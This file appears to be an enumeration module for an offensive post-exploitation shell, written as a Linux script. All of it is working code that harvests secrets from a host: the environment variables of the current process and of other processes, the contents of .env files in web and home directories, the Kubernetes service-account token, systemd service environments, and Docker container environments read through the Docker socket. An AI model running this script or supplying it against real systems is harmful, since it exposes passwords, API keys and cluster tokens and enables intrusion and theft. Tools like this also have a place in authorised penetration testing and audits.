// @name: env_secrets
// @description: Environment variables, process secrets, and mounted secret stores
// @category: enumerate
// @target_os: linux
// @author: clawsh
// @version: 1.0

let output = "=== Environment & Secret Enumeration ===\n";
let findings = 0;

// --- Current process environment ---
output += "\n\x1b[1;4mSensitive Environment Variables:\x1b[0m\n";
let env_sensitive = exec_cmd("env 2>/dev/null | grep -iE 'KEY|SECRET|TOKEN|PASS|AUTH|CRED|API|PRIVATE|DATABASE_URL|MONGO|REDIS|MYSQL|POSTGRES|SMTP|AWS|AZURE|GCP' | sort");
if env_sensitive.len() > 0 {
    for line in env_sensitive.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
} else {
    output += "  (none found)\n";
}

// --- /proc/self/environ ---
output += "\n\x1b[1;4m/proc/self/environ:\x1b[0m\n";
let proc_env = exec_cmd("cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'KEY|SECRET|TOKEN|PASS|AUTH|CRED|API|DATABASE' | head -20");
if proc_env.len() > 0 {
    for line in proc_env.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
} else {
    output += "  (none found or not readable)\n";
}

// --- Other processes' environ (if readable) ---
output += "\n\x1b[1;4mOther Processes' Secrets (/proc/*/environ):\x1b[0m\n";
let other_envs = exec_cmd("timeout 15 sh -c 'for pid in $(ls /proc/ 2>/dev/null | grep -E \"^[0-9]+$\" | head -50); do cat /proc/$pid/environ 2>/dev/null | tr \"\\0\" \"\\n\" | grep -iE \"KEY|SECRET|TOKEN|PASS|AUTH|CRED|API\" | while read line; do echo \"PID $pid: $line\"; done; done' | sort -u | head -30");
if other_envs.len() > 0 {
    for line in other_envs.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[1;33m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
} else {
    output += "  (not readable or no secrets found)\n";
}

// --- .env files in common locations ---
output += "\n\x1b[1;4m.env Files:\x1b[0m\n";
let env_files = exec_cmd("timeout 15 find /var/www /opt /srv /home /root -maxdepth 4 -name '.env' -type f -readable 2>/dev/null | head -15");
if env_files.len() > 0 {
    for line in env_files.split("\n") {
        if line.len() > 0 {
            output += "\n  \x1b[33m" + line + ":\x1b[0m\n";
            let content = exec_cmd("grep -vE '^#|^$' " + line + " 2>/dev/null | head -15");
            if content.len() > 0 {
                for c in content.split("\n") {
                    if c.len() > 0 {
                        output += "    " + c + "\n";
                    }
                }
            }
            findings += 1;
        }
    }
} else {
    output += "  (none found)\n";
}

// --- Kubernetes secrets ---
output += "\n\x1b[1;4mKubernetes Secrets:\x1b[0m\n";
let k8s_secrets = exec_cmd("ls -la /var/run/secrets/ 2>/dev/null");
let k8s_sa_token = exec_cmd("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 80");
let k8s_namespace = exec_cmd("cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null");
let k8s_ca = exec_cmd("test -f /var/run/secrets/kubernetes.io/serviceaccount/ca.crt && echo 'YES' || echo 'NO'");

if k8s_secrets.len() > 0 {
    output += "  \x1b[1;31m/var/run/secrets/ accessible!\x1b[0m\n";
    for line in k8s_secrets.split("\n") {
        if line.len() > 0 {
            output += "    " + line + "\n";
        }
    }
    findings += 1;
}
if k8s_sa_token.len() > 0 {
    output += "  \x1b[1;31mSA Token: " + k8s_sa_token + "...\x1b[0m\n";
    findings += 1;
}
if k8s_namespace.len() > 0 {
    output += "  Namespace: " + k8s_namespace.trim() + "\n";
}
if k8s_ca.contains("YES") {
    output += "  CA cert available\n";
}

if k8s_secrets.len() == 0 && k8s_sa_token.len() == 0 {
    output += "  (not in Kubernetes or secrets not mounted)\n";
}

// --- systemd service environment ---
output += "\n\x1b[1;4mSystemd Service Environments:\x1b[0m\n";
let systemd_envs = exec_cmd("timeout 10 sh -c \"systemctl show '*' --property=Environment 2>/dev/null\" | grep -v '^Environment=$' | grep -iE 'KEY|SECRET|TOKEN|PASS|AUTH|CRED|API' | head -15");
if systemd_envs.len() > 0 {
    for line in systemd_envs.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
} else {
    output += "  (none found or not accessible)\n";
}

// --- Docker environment (if docker socket available) ---
let docker_sock = exec_cmd("test -S /var/run/docker.sock && echo 'YES' || echo 'NO'");
if docker_sock.contains("YES") {
    output += "\n\x1b[1;4mDocker Container Environments:\x1b[0m\n";
    let docker_containers = exec_cmd("timeout 5 docker ps -q 2>/dev/null | head -10");
    if docker_containers.len() > 0 {
        for cid in docker_containers.split("\n") {
            if cid.len() > 0 {
                let cname = exec_cmd("docker inspect --format '{{.Name}}' " + cid + " 2>/dev/null");
                let cenv = exec_cmd("docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' " + cid + " 2>/dev/null | grep -iE 'KEY|SECRET|TOKEN|PASS|AUTH|CRED|API' | head -10");
                if cenv.len() > 0 {
                    output += "  \x1b[33mContainer " + cname.trim() + ":\x1b[0m\n";
                    for line in cenv.split("\n") {
                        if line.len() > 0 {
                            output += "    " + line + "\n";
                            findings += 1;
                        }
                    }
                }
            }
        }
    }
}

// --- /proc/cmdline (boot parameters may have secrets) ---
output += "\n\x1b[1;4mBoot Parameters:\x1b[0m\n";
let cmdline = exec_cmd("cat /proc/cmdline 2>/dev/null");
if cmdline.len() > 0 {
    output += "  " + cmdline.trim() + "\n";
}

// --- Summary ---
output += "\n\x1b[1m" + findings.to_string() + " secret(s) found\x1b[0m\n";

print_output(output);

let RESULT = findings.to_string() + " secret(s) found";

let DATA = #{
    findings: findings,
    has_k8s_secrets: k8s_sa_token.len() > 0,
    has_env_files: env_files.len() > 0,
    docker_socket: docker_sock.contains("YES"),
};
